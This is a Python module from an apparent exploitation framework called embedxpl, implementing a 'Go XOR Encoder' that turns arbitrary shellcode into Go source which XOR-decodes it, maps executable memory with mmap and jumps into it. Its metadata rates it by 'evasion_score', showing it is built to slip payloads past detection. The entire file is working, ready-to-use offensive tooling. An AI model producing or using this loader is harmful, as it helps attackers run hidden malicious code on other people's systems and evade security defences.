"""Go XOR encoder — gera source Go com payload XOR-encoded."""

import os as _os
from embedxpl.core.exploit.encoders import BaseEncoder
from embedxpl.core.exploit.payloads import Architectures


class Encoder(BaseEncoder):
    __info__ = {
        "name": "Go XOR Encoder",
        "description": "Generates Go source with XOR-decoded payload + mmap exec.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
        "evasion_score": 6,
    }

    architecture = None

    def encode(self, payload: bytes) -> bytes:  # type: ignore[override]
        key = _os.urandom(1)[0]
        xored = bytes(b ^ key for b in payload)
        hex_bytes = ",".join(f"0x{b:02x}" for b in xored)
        src = (
            'package main\nimport ("syscall";"unsafe")\n'
            f'func main() {{\n'
            f'    key := byte(0x{key:02x})\n'
            f'    sc := []byte{{{hex_bytes}}}\n'
            '    for i := range sc { sc[i] ^= key }\n'
            '    addr, _, _ := syscall.Syscall(syscall.SYS_MMAP, 0, uintptr(len(sc)),\n'
            '        syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC,\n'
            '        syscall.MAP_ANON|syscall.MAP_PRIVATE, 0, 0)\n'
            '    for i, b := range sc { *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }\n'
            '    syscall.Syscall(addr, 0, 0, 0)\n'
            '}\n'
        )
        return src.encode()
